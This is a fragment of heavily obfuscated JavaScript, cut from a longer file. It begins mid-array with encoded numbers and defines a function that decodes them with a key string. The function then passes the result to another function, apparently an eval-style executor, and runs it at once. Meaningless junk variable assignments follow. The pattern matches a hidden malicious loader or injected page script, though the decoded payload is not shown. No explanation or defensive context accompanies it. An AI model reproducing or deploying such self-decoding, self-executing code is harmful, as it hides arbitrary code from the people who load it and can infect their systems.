161, 89, 92, 108, 64, 59, 60, 58, 176, 62, 61, 58, 176, 62, 61, 62, 61, 58, 163, 149, 153, 144, 166, 165, 148, 163, 167, 89, 92, 108, 64, 59, 60],
    cdrsx = function() {
        for (var aehmpw; achkv < cdistx.length; achkv += 1) {
            var bcfip = achkv % dfhkn.length + 1;
            var kouy = dfhkn.substring(achkv % dfhkn.length, bcfip);
            var bcjlpx = cdistx[achkv];
            zdiw += rgzfo(bcjlpx - kouy.charCodeAt(0));
        }
        ahpr(zdiw);
    };
cdrsx();
ijoqy = true;
fnzo = "fnzo";
fjqt = false;
cory = '';
ijpqt = "ijpqt";
tidwzm = '';
fgnrsx = 29897;
dhijm = "";
xcfzjy = 44959;
cfjv = "";
crtu = 64244;
klmouv = 22416;
dlnv = 2035;
fgip = "fgip";
zpci = 29470;

